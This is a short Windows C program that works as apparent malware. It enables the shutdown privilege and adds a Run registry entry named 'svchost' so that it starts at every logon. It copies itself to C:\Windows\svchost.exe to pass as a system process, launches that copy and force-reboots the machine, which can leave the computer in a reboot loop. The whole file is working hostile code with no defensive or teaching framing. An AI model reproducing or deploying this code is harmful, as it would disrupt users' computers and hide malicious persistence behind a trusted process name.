#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>

// int main(int argc, char const *argv[])
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstance, LPSTR lPCmdLine, int nCmdShow)
{
	HANDLE hToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

	LUID luid;
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid);

	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = luid;

	AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);

	HKEY hKey;
	if(ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey)) {
		return -1;
	}

	wchar_t szAppPath[260];
	GetModuleFileName(NULL, szAppPath, MAX_PATH);

	wchar_t szObjPath[260] = L"C://Windows//svchost.exe";
	CopyFile(szAppPath, szObjPath, FALSE);

	RegSetValueEx(hKey, L"svchost", 0, REG_SZ, (const BYTE*)szAppPath, 260);

	RegCloseKey(hKey);

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi = {0};
	CreateProcess(NULL, szObjPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	// system("shutdown -r -t 0");

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);

	return 0;
}